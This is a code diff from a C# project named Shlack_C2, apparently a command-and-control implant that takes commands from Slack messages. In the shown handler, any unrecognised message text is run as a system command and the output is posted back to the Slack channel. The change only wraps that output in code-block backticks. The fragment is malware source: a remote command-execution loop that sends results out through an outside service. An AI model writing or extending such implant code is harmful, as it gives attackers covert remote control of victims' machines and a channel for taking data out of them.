@@ -69,7 +69,7 @@ namespace Shlack_C2
 
                         default: //Execute command if no keywords used
                             string output = Execute(message.text);
-                            client.PostMessage(null, message.channel.ToString(), output);
+                            client.PostMessage(null, message.channel.ToString(), "```" + output + "```");
                             break;
                     }
                 }
